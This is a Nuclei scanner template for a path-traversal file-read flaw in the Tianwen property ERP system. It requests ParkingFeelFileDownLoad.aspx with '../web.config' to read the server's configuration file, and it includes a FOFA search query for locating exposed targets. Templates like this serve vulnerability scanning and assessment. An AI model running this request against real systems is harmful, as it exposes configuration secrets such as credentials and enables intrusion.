id: tianwen-erp-ParkingFeelFileDownLoad-fileread

info:
  name: tianwen-erp-ParkingFeelFileDownLoad-fileread
  author: fitz
  severity: high
  tags: 2024hvv,fileread
  metadata:
    verified: true
    max-request: 1
    fofa-query: "天问物业ERP系统"

http:
  - raw:
      - |
        GET /HM/M_main/InformationManage/ParkingFeelFileDownLoad.aspx?ParkingFile=../web.config HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '<?xml version="1.0" encoding="UTF-8"?>'

      - type: status
        status:
          - 200